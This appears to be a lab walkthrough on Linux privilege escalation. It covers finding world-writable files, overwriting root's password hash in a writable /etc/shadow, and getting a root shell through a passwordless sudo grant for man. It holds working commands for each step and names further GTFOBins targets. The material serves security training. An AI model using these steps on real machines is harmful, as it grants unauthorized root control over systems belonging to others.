# Linux Privilege Escalation â€“ Weak Permissions & Sudo Misconfigurations

## ðŸ” 1. Weak File Permissions (World-Writable Files)

### Automated Enumeration with LinEnum
- **Tool**: [LinEnum](https://github.com/rebootuser/LinEnum)  
- **Purpose**: Automates local enumeration + highlights privesc vectors:
  - World-writable files
  - SUID/SGID binaries
  - Cron job issues
  - Password reuse
  - Container detection

> ðŸ’¡ Run early:  
> ```bash
> ./LinEnum.sh -t -k password -r report.txt
> ```

---
### Manual Check: Find World-Writable Files
```bash
find / -not -type l -perm -o+w 2>/dev/null
```
- `-not -type l`: Exclude symbolic links (reduces noise)  
- `-perm -o+w`: Files writable by **others** (any user)  
- `2>/dev/null`: Suppress "Permission denied" errors

âœ… **Critical finding**:  
`/etc/shadow` appears â†’ **all users can modify root hash**

>World-writable critical files (`/etc/passwd`, `/etc/shadow`, `/etc/sudoers`)  

---
### Verify & Exploit `/etc/shadow` Write Access
#### Step 1: Confirm Permissions
```bash
ls -al /etc/shadow
```
âœ… Output:  
`-rw-rw-rw- 1 root root ... /etc/shadow` â†’ **world-writable**

#### Step 2: Generate New Root Password Hash
```bash
openssl passwd -1 -salt abc new_password
```
- **`openssl`**: Cryptographic toolkit (preinstalled on most Linux systems)  
- **`-1`**: Use **MD5-based crypt()** (legacy but widely supported)  
- **`-salt abc`**: Static salt for reproducible hash  
- **`new_password`**: Your chosen password  

âœ… Output:  
`$1$abc$TzHl8.P0G3j7f4XKqF6ZM0`

#### Step 3: Replace Root Hash
```bash
# Backup original
cp /etc/shadow /etc/shadow.bak

# Edit shadow file
nano /etc/shadow
```
Replace root line:  
`root:$1$abc$TzHl8.P0G3j7f4XKqF6ZM0:18295:0:99999:7:::`

#### Step 4: Login as Root
```bash
su root
Password: new_password
```
âœ… **Full root access**

> âš ï¸ **Note**: Modern systems use SHA-512 (`$6$`) â€” use `mkpasswd -m sha-512` if available

---
## ðŸ”‘ 2. Sudo Misconfigurations

### Identify Sudo Rights
```bash
sudo -l
```
âœ… Output:  
```
User student may run the following commands on ubunu2004:
    (root) NOPASSWD: /usr/bin/man
```

> ðŸ’¡ **Why this is dangerous**:  
> Admins often grant `NOPASSWD` to avoid password prompts for "harmless" tools like `man` â€” but many can spawn shells.

---
### Exploit: Shell Escape from `man`
#### Step 1: Launch `man` as root
```bash
sudo man ls
```

#### Step 2: Spawn shell from within `man`
Inside the `man` pager, type:  
```text
!/bin/bash
```
- `!` = execute shell command  
- Drops to **root shell** (`uid=0`)

âœ… Result:  
```bash
root@ubunu2004:/home/student# cd /root
root@ubunu2004:/root# cat flag
```

> ðŸ”¥ **Golden Rule**:  
> **Any program with `NOPASSWD` sudo rights that supports shell escapes = instant root.**  
> Common GTFOBins targets: `man`, `vim`, `less`, `more`, `find`, `awk`

